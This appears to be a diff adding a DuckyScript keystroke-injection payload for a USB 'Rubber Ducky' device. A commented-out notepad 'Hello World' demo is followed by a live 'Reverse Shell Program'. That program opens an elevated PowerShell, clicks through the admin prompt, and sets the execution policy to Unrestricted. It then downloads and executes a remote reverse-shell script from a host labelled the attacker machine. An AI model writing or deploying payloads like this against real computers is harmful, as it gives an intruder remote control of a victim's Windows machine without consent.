@@ -1,0 +1,30 @@
+REM My First Script 
+REM WINDOWS r  
+REM DELAY 100  
+REM STRING notepad.exe  
+REM ENTER  
+REM DELAY 200  
+REM STRING Hello World! 
+
+REM Reverse Shell Program
+DELAY 100
+REM Open the Run window
+WINDOWS r
+DELAY 1000
+REM Execute PowerShell as Admin
+STRING powershell "Start-Process powershell -verb runAs"
+DELAY 100
+ENTER
+DELAY 5000
+ALT y
+DELAY 1000
+REM Enable script Execution
+STRING Set-ExecutionPolicy Unrestricted
+ENTER
+DELAY 5000
+REM Accept the message prompt
+ENTER
+REM Connect to the attacker machine
+STRING IEX (New-Object Net.WebClient).DownloadString
+('http://10.0.20.140/ps.reverse.ps1')
+ENTER
